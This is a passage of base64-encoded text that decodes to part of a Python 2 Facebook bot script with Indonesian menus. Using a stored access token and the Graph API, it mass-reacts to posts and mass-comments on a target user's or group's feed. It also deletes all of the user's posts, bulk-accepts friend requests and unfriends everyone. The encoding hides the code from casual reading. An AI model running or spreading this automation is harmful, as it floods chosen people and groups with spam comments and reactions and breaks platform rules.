YgbWVudV9yZWFjdCgpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLiBcMDMzWzE7OTdtTGlrZSIpCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLiBcMDMzWzE7OTdtTG92ZSIpCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLiBcMDMzWzE7OTdtV293IikKCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTQuIFwwMzNbMTs5N21IYWhhIikKCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTUuIFwwMzNbMTs5N21TYWRCb3kiKQoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNi4gXDAzM1sxOzk3bUFuZ3J5IikKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siCglwcmludCAi4pWRIgoJcmVhY3RfcGlsaWgoKQojLy8vLy8vLy8vLy8vLy8KZGVmIHJlYWN0X3BpbGloKCk6CglnbG9iYWwgdGlwZQoJYWtzaSA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1FbnRlciBcMDMzWzE7OTdtIikKCWlmIGFrc2kgPT0iIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKCQlyZWFjdF9waWxpaCgpCgllbGlmIGFrc2kgPT0iMSI6CgkJdGlwZSA9ICJMSUtFIgoJCXJlYWN0KCkKCWVsaWYgYWtzaSA9PSIyIjoKCQl0aXBlID0gIkxPVkUiCgkJcmVhY3QoKQoJZWxpZiBha3NpID09IjMiOgoJCXRpcGUgPSAiV09XIgoJCXJlYWN0KCkKCWVsaWYgYWtzaSA9PSI0IjoKCQl0aXBlID0gIkhBSEEiCgkJcmVhY3QoKQoJZWxpZiBha3NpID09IjUiOgoJCXRpcGUgPSAiU0FEIgoJCXJlYWN0KCkKCWVsaWYgYWtzaSA9PSI2IjoKCQl0aXBlID0gIkFOR1JZIgoJCXJlYWN0KCkKCWVsaWYgYWtzaSA9PSIwIjoKCQltZW51X2JvdCgpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCXJlYWN0X3BpbGloKCkKIyMjIyNORVhUCmRlZiByZWFjdCgpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglpZGUgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIFRhcmdldCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCWxpbWl0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1MaW1pdCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCXRyeToKCQlvaCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZGUrIj9maWVsZHM9ZmVlZC5saW1pdCgiK2xpbWl0KyIpJmFjY2Vzc190b2tlbj0iK3Rva2V0KQoJCWFoID0ganNvbi5sb2FkcyhvaC50ZXh0KQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWZvciBhIGluIGFoWydmZWVkJ11bJ2RhdGEnXToKCQkJeSA9IGFbJ2lkJ10KCQkJcmVha3NpLmFwcGVuZCh5KQoJCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3krIi9yZWFjdGlvbnM/dHlwZT0iK3RpcGUrIiZhY2Nlc3NfdG9rZW49Iit0b2tldCkKCQkJcHJpbnQgJ1wwMzNbMTs5Mm1bXDAzM1sxOzk3bScreVs6MTBdLnJlcGxhY2UoJ1xuJywnICcpKycuLi4gXDAzM1sxOzkybV0gXDAzM1sxOzk3bScrdGlwZQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICJcclwwMzNbMTs5MW1bK11cMDMzWzE7OTJtIERvbmUgXDAzM1sxOzk3bSIrc3RyKGxlbihyZWFrc2kpKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV9ib3QoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gSUQgbm90IGZvdW5kIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV9ib3QoKQoJCQojIyMjIyBCT1QgUkVBQ1QgR1JVUCAjIyMjIwpkZWYgZ3J1cF9yZWFjdCgpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLiBcMDMzWzE7OTdtTGlrZSIpCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLiBcMDMzWzE7OTdtTG92ZSIpCglwcmludCAoIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLiBcMDMzWzE7OTdtV293IikKCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTQuIFwwMzNbMTs5N21IYWhhIikKCXByaW50ICgiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTUuIFwwMzNbMTs5N21TYWRCb3kiKQoJcHJpbnQgKCJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNi4gXDAzM1sxOzk3bUFuZ3J5IikKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siCglwcmludCAi4pWRIgoJcmVhY3RnX3BpbGloKCkKIy8vLy8vLy8vLy8vLy8vCmRlZiByZWFjdGdfcGlsaWgoKToKCWdsb2JhbCB0aXBlCglha3NpID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbUVudGVyIFwwMzNbMTs5N20iKQoJaWYgYWtzaSA9PSIiOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCXJlYWN0Z19waWxpaCgpCgllbGlmIGFrc2kgPT0iMSI6CgkJdGlwZSA9ICJMSUtFIgoJCXJlYWN0ZygpCgllbGlmIGFrc2kgPT0iMiI6CgkJdGlwZSA9ICJMT1ZFIgoJCXJlYWN0ZygpCgllbGlmIGFrc2kgPT0iMyI6CgkJdGlwZSA9ICJXT1ciCgkJcmVhY3RnKCkKCWVsaWYgYWtzaSA9PSI0IjoKCQl0aXBlID0gIkhBSEEiCgkJcmVhY3RnKCkKCWVsaWYgYWtzaSA9PSI1IjoKCQl0aXBlID0gIlNBRCIKCQlyZWFjdGcoKQoJZWxpZiBha3NpID09IjYiOgoJCXRpcGUgPSAiQU5HUlkiCgkJcmVhY3RnKCkKCWVsaWYgYWtzaSA9PSIwIjoKCQltZW51X2JvdCgpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCXJlYWN0Z19waWxpaCgpCiMjIyMjTkVYVApkZWYgcmVhY3RnKCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCWlkZSA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgR3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCglsaW1pdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtTGltaXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCgl0cnk6CgkJcj1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2dyb3VwLz9pZD0nK2lkZSsnJmFjY2Vzc190b2tlbj0nK3Rva2V0KQoJCWFzdz1qc29uLmxvYWRzKHIudGV4dCkKCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZ3J1cF9yZWFjdCgpCgl0cnk6CgkJb2ggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YzLjAvIitpZGUrIj9maWVsZHM9ZmVlZC5saW1pdCgiK2xpbWl0KyIpJmFjY2Vzc190b2tlbj0iK3Rva2V0KQoJCWFoID0ganNvbi5sb2FkcyhvaC50ZXh0KQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWZvciBhIGluIGFoWydmZWVkJ11bJ2RhdGEnXToKCQkJeSA9IGFbJ2lkJ10KCQkJcmVha3NpZ3J1cC5hcHBlbmQoeSkKCQkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit5KyIvcmVhY3Rpb25zP3R5cGU9Iit0aXBlKyImYWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCXByaW50ICdcMDMzWzE7OTJtW1wwMzNbMTs5N20nK3lbOjEwXS5yZXBsYWNlKCdcbicsJyAnKSsnLi4uIFwwMzNbMTs5Mm1dIFwwMzNbMTs5N20nK3RpcGUKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCAiXHJcMDMzWzE7OTFtWytdXDAzM1sxOzkybSBEb25lIFwwMzNbMTs5N20iK3N0cihsZW4ocmVha3NpZ3J1cCkpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2JvdCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBJRCBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2JvdCgpCgkKIyMjIyMgQk9UIEtPTUVOICMjIyMjCmRlZiBib3Rfa29tZW4oKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkybVVzZSBcMDMzWzE7OTdtJzw+JyBcMDMzWzE7OTJtZm9yIG5ldyBsaW5lcyIKCWlkZSA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSUQgVGFyZ2V0IFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQoJa20gPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUNvbW1lbnQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCglsaW1pdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtTGltaXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCglrbT1rbS5yZXBsYWNlKCc8PicsJ1xuJykKCXRyeToKCQlwID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkZSsiP2ZpZWxkcz1mZWVkLmxpbWl0KCIrbGltaXQrIikmYWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJYSA9IGpzb24ubG9hZHMocC50ZXh0KQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWZvciBzIGluIGFbJ2ZlZWQnXVsnZGF0YSddOgoJCQlmID0gc1snaWQnXQoJCQlrb21lbi5hcHBlbmQoZikKCQkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitmKyIvY29tbWVudHM/bWVzc2FnZT0iK2ttKyImYWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJCXByaW50ICdcMDMzWzE7OTJtW1wwMzNbMTs5N20nK2ttWzoxMF0ucmVwbGFjZSgnXG4nLCcgJykrJy4uLiBcMDMzWzE7OTJtXScKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCAiXHJcMDMzWzE7OTFtWytdXDAzM1sxOzkybSBEb25lIFwwMzNbMTs5N20iK3N0cihsZW4oa29tZW4pKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV9ib3QoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gSUQgbm90IGZvdW5kIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV9ib3QoKQoKIyMjIyMgQk9UIEtPTUVOIEdSVVAgIyMjIyMKZGVmIGdydXBfa29tZW4oKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkybVVzZSBcMDMzWzE7OTdtJzw+JyBcMDMzWzE7OTJtZm9yIG5ldyBsaW5lcyIKCWlkZSA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSUQgR3JvdXAgIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQoJa20gPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUNvbW1lbnQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCglsaW1pdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtTGltaXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCglrbT1rbS5yZXBsYWNlKCc8PicsJ1xuJykKCXRyeToKCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWRlKycmYWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJYXN3PWpzb24ubG9hZHMoci50ZXh0KQoJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBHcm91cCBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2JvdCgpCgl0cnk6CgkJcCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjMuMC8iK2lkZSsiP2ZpZWxkcz1mZWVkLmxpbWl0KCIrbGltaXQrIikmYWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJYSA9IGpzb24ubG9hZHMocC50ZXh0KQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWZvciBzIGluIGFbJ2ZlZWQnXVsnZGF0YSddOgoJCQlmID0gc1snaWQnXQoJCQlrb21lbmdydXAuYXBwZW5kKGYpCgkJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrZisiL2NvbW1lbnRzP21lc3NhZ2U9IitrbSsiJmFjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQlwcmludCAnXDAzM1sxOzkybVtcMDMzWzE7OTdtJytrbVs6MTBdLnJlcGxhY2UoJ1xuJywnICcpKycuLi4gXDAzM1sxOzkybV0nCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJcHJpbnQgIlxyXDAzM1sxOzkxbVsrXVwwMzNbMTs5Mm0gRG9uZSBcMDMzWzE7OTdtIitzdHIobGVuKGtvbWVuZ3J1cCkpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2JvdCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfYm90KCkKCQkKIyMjIyMgSEFQVVMgUE9TVCAjIyMjIwpkZWYgZGVsZXRlcG9zdCgpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJCW5hbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJbG9sID0ganNvbi5sb2FkcyhuYW0udGV4dCkKCQluYW1hID0gbG9sWyduYW1lJ10KCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJcHJpbnQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZyb20gXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiVuYW1hKQoJamFsYW4oIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVN0YXJ0XDAzM1sxOzk3bSAuLi4iKQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglhc3UgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZlZWQ/YWNjZXNzX3Rva2VuPScrdG9rZXQpCglhc3VzID0ganNvbi5sb2Fkcyhhc3UudGV4dCkKCWZvciBwIGluIGFzdXNbJ2RhdGEnXToKCQlpZCA9IHBbJ2lkJ10KCQlwaXJvID0gMAoJCXVybCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZCsnP21ldGhvZD1kZWxldGUmYWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJb2sgPSBqc29uLmxvYWRzKHVybC50ZXh0KQoJCXRyeToKCQkJZXJyb3IgPSBva1snZXJyb3InXVsnbWVzc2FnZSddCgkJCXByaW50ICdcMDMzWzE7OTFtW1wwMzNbMTs5N20nK2lkWzoxMF0ucmVwbGFjZSgnXG4nLCcgJykrJy4uLicrJ1wwMzNbMTs5MW1dIFwwMzNbMTs5NW1GYWlsZWQnCgkJZXhjZXB0IFR5cGVFcnJvcjoKCQkJcHJpbnQgJ1wwMzNbMTs5Mm1bXDAzM1sxOzk3bScraWRbOjEwXS5yZXBsYWNlKCdcbicsJyAnKSsnLi4uJysnXDAzM1sxOzkybV0gXDAzM1sxOzk2bURlbGV0ZWQnCgkJCXBpcm8gKz0gMQoJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQkJcHJpbnQiXDAzM1sxOzkxbVshXSBDb25uZWN0aW9uIEVycm9yIgoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQltZW51X2JvdCgpCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCXByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybURvbmUiCglyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJbWVudV9ib3QoKQoJCiMjIyMjIEFDQ0VQVCBGUklFTkQgIyMjIyMKZGVmIGFjY2VwdCgpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglsaW1pdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtTGltaXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCglyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRyZXF1ZXN0cz9saW1pdD0nK2xpbWl0KycmYWNjZXNzX3Rva2VuPScrdG9rZXQpCgl0ZW1hbiA9IGpzb24ubG9hZHMoci50ZXh0KQoJaWYgJ1tdJyBpbiBzdHIodGVtYW5bJ2RhdGEnXSk6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBObyBmcmllbmQgcmVxdWVzdCIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfYm90KCkKCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglmb3IgaSBpbiB0ZW1hblsnZGF0YSddOgoJCWdhcyA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHMvJytpWydmcm9tJ11bJ2lkJ10rJz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlhID0ganNvbi5sb2FkcyhnYXMudGV4dCkKCQlpZiAnZXJyb3InIGluIHN0cihhKToKCQkJcHJpbnQgIlwwMzNbMTs5N21bIFwwMzNbMTs5MW1GYWlsZWRcMDMzWzE7OTdtIF0gIitpWydmcm9tJ11bJ25hbWUnXQoJCWVsc2U6CgkJCXByaW50ICJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtQWNjZXB0XDAzM1sxOzk3bSBdICIraVsnZnJvbSddWyduYW1lJ10KCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRG9uZSIKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgltZW51X2JvdCgpCgkKIyMjIyMgVU5GUklFTkQgIyMjIwpkZWYgdW5mcmllbmQoKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCglwcmludCAiXDAzM1sxOzk3bVN0b3AgXDAzM1sxOzkxbUNUUkwrQyIKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJdHJ5OgoJCXBlayA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQljb2sgPSBqc29uLmxvYWRzKHBlay50ZXh0KQoJCWZvciBpIGluIGNva1snZGF0YSddOgoJCQluYW1hID0gaVsnbmFtZSddCgkJCWlkID0gaVsnaWQnXQoJCQlyZXF1ZXN0cy5kZWxldGUoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/dWlkPSIraWQrIiZhY2Nlc3NfdG9rZW49Iit0b2tldCkKCQkJcHJpbnQgIlwwMzNbMTs5N21bXDAzM1sxOzkybSBEZWxldGVkIFwwMzNbMTs5N21dICIrbmFtYQoJZXhjZXB0IEluZGV4RXJyb3I6IHBhc3MKCWV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBTdG9wcGVkIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV9ib3QoKQoJcHJpbnQiXG5cMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Eb25lIgoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCW1lbnVfYm90KCkKCQojIyMjIExBSU4gTEFJTiAjIyMjIwojICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIwojIyMjTUVOVSBMQUlOIyMjIyMKZGVmIGxhaW4oKToKCW9zLnN5c